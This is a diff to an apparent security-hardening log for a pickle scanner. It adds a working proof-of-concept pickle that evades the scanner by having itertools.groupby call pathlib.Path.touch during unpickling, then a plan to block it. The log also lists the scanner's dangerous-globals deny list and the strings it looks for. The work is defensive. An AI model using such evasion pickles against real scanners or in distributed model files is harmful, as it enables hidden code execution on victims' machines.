@@ -1016,3 +1016,92 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add iterable-flow analysis or broader string
 scanning.
+
+## Turn 27 - `itertools.groupby` key-function call gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+marker = Path("/tmp/ma_itertools_groupby_tuple_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("builtins"),
+        s("tuple"),
+        b"\x93",
+        s("itertools"),
+        s("groupby"),
+        b"\x93",
+        b"]",
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_itertools_groupby_tuple_marker"),
+        b"tRa",
+        s("pathlib"),
+        s("Path.touch"),
+        b"\x93",
+        b"\x86R",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
+  `notices=[]`
+- Unpickle result: creates `/tmp/ma_itertools_groupby_tuple_marker` and
+  returns a one-element tuple whose key is `None` and whose group object is an
+  `itertools._grouper`
+- RCE mechanism: the pickle constructs
+  `itertools.groupby([marker], pathlib.Path.touch)`, then immediately calls
+  `tuple(...)` on that groupby object. `groupby()` stores an
+  attacker-selected key callable and iterable inputs, while `tuple()` forces
+  iteration during unpickling, invoking the key callable with
+  attacker-controlled arguments. `Path.touch()` returns `None`, so the group
+  key is `None` while the side effect still occurs.
+
+Why the scanner missed it:
+
+- `itertools.groupby` is absent from `DANGEROUS_GLOBALS`; only
+  `itertools.dropwhile`, `itertools.filterfalse`, `itertools.starmap`, and
+  `itertools.takewhile` are currently listed.
+- The payload uses only currently clean globals: `builtins.tuple`,
+  `itertools.groupby`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is another lazy arbitrary-call sink that can be forced
+by a benign builtin. The narrow next block is a sorted `DANGEROUS_GLOBALS`
+entry for `("itertools", "groupby")`, plus a manual-pickle oracle regression
+that proves scan-time detection before unpickle-time marker creation.
+
+## Turn 28 - Block `itertools.groupby`
+
+Blocking plan:
+
+- Add `("itertools", "groupby")` to the sorted Rust `DANGEROUS_GLOBALS`
+  table. `tuple` stays allowed because the arbitrary-call sink is `groupby`;
+  `tuple` only forces iteration.
+- Add portable policy coverage for raw `GLOBAL itertools groupby` reductions.
+- Add a CPython oracle regression that manually builds
+  `tuple(itertools.groupby([marker], pathlib.Path.touch))`, verifies scanner
+  detection, then verifies the marker file appears only during unpickle.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add iterable-flow analysis or broader string
+scanning.
